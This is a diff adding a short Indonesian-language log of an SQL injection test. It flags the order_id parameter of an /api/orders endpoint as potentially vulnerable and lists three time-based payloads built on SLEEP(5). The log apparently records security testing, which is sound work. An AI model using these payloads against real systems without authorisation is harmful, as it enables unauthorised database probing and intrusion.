@@ -1,0 +1,6 @@
+=== LAPORAN PENGUJIAN SQL INJECTION - 2025-05-19T09:42:57.914Z ===
+
+2025-05-19T09:42:57.918Z - === PENGUJIAN SQL INJECTION PADA PARAMETER GET ===
+2025-05-19T09:45:39.227Z - [POTENSI VULNERABLE - TIME BASED] Endpoint: /api/orders, Parameter: order_id, Payload: ' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+2025-05-19T09:45:49.743Z - [POTENSI VULNERABLE - TIME BASED] Endpoint: /api/orders, Parameter: order_id, Payload: ' OR SLEEP(5)--
+2025-05-19T09:46:00.279Z - [POTENSI VULNERABLE - TIME BASED] Endpoint: /api/orders, Parameter: order_id, Payload: ' OR SLEEP(5) AND '1'='1
